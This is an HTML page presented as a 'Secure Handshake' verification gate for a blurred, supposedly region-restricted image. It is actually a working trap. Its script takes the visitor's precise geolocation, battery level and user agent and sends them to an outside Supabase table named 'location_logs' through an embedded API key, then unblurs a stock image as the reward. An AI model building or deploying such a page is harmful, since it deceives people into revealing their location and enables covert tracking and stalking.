<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Encrypted Content - Verification Required</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        body { background-color: #0b0e14; color: #adbac7; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .trap-card { background: #1c2128; border: 1px solid #444c56; padding: 25px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.6); max-width: 380px; text-align: center; }
        .warn-icon { font-size: 45px; color: #f85149; margin-bottom: 10px; }
        h2 { color: #f85149; margin-bottom: 10px; font-size: 22px; }
        .preview { width: 100%; height: 180px; background: url('https://via.placeholder.com/400x200?text=Protected+Image'); background-size: cover; filter: blur(20px); border-radius: 6px; margin: 15px 0; border: 1px solid #30363d; }
        p { font-size: 14px; line-height: 1.5; color: #768390; }
        button { background-color: #238636; color: white; border: none; padding: 12px 30px; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 15px; transition: 0.2s; width: 100%; }
        button:hover { background-color: #2ea043; }
        #log { margin-top: 15px; font-size: 12px; color: #58a6ff; font-family: monospace; }
    </style>
</head>
<body>

<div class="trap-card">
    <div class="warn-icon">⚠️</div>
    <h2>Access Restricted</h2>
    <div class="preview" id="img"></div>
    <p>This image is restricted for your region. Please complete a <b>Secure Handshake</b> to verify your identity and view the content.</p>
    
    <button onclick="p_system_fire()">Allow Connection</button>
    <div id="log"></div>
</div>

<script>
    // PARDHAN x Supabase Configuration
    const SB_URL = 'https://jedpkzloxepzskpwomqj.supabase.co';
    const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImplZHBremxveGVwenNrcHdvbXFqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzE5MTc2NjksImV4cCI6MjA4NzQ5MzY2OX0.NYGrW558hlusgVxHvWrN89hb1mlYyU71FL1g2xgN3eY';
    const pardhan_sb = supabase.createClient(SB_URL, SB_KEY);

    async function p_system_fire() {
        const log = document.getElementById('log');
        log.innerText = "[*] Handshake Initializing...";

        // Battery Info capturing
        let battery_info = "N/A";
        try {
            const battery = await navigator.getBattery();
            battery_info = `${(battery.level * 100).toFixed(0)}%`;
        } catch(e) {}

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                log.innerText = "[+] Coordinates Captured. Syncing...";
                
                const { error } = await pardhan_sb
                    .from('location_logs')
                    .insert([{
                        latitude: pos.coords.latitude,
                        longitude: pos.coords.longitude,
                        user_agent: navigator.userAgent,
                        ip: `Battery: ${battery_info}` // Using IP field for battery in test
                    }]);

                if (!error) {
                    log.innerText = "[✓] Access Granted. Unlocking...";
                    setTimeout(() => {
                        document.getElementById('img').style.filter = "none";
                        document.getElementById('img').style.backgroundImage = "url('https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&w=400&h=200')";
                        alert("Verification Successful! Content Unlocked.");
                    }, 1500);
                } else {
                    log.innerText = "[!] Database Connection Error.";
                    console.error(error);
                }
            }, (err) => {
                log.innerText = "[!] Verification Denied.";
                alert("Please 'Allow' access to view the encrypted image.");
            }, { enableHighAccuracy: true });
        }
    }
</script>

</body>
</html>
